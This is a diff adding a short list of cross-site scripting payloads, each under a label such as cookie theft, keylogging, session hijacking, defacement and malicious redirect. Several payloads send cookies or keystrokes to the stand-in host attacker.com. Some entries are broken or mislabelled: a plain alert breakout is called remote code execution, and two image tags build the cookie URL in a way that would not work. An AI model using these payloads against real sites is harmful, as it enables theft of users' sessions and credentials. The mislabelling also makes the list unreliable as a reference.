@@ -1,0 +1,26 @@
+Cookie Theft
+<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie;</script>
+
+Keylogging for Credential Theft:
+<script>document.onkeydown=function(e){new Image().src='https://attacker.com/log.php?c='+e.keyCode;}</script>
+
+Session Hijacking:
+<img src='https://attacker.com/hijack.php?session='+document.cookie'/>
+
+Defacement of Website:
+<script>document.body.innerHTML='<h1>Website Hacked</h1>';</script>
+
+Malicious Redirect:
+<script>document.location='https://attacker.com/malicious.html';</script>
+
+Remote Code Execution:
+'); alert('XSS Attack!'); ('
+
+Bypassing Security Controls:
+<img src='x' onerror='alert("XSS Attack!")'>
+
+Document Object Model (DOM) Manipulation:
+<script>document.getElementById('targetElement').innerHTML='Modified by XSS';</script>
+
+Stored XSS in User Profile:
+<img src='https://attacker.com/steal.php?cookie='+document.cookie' />
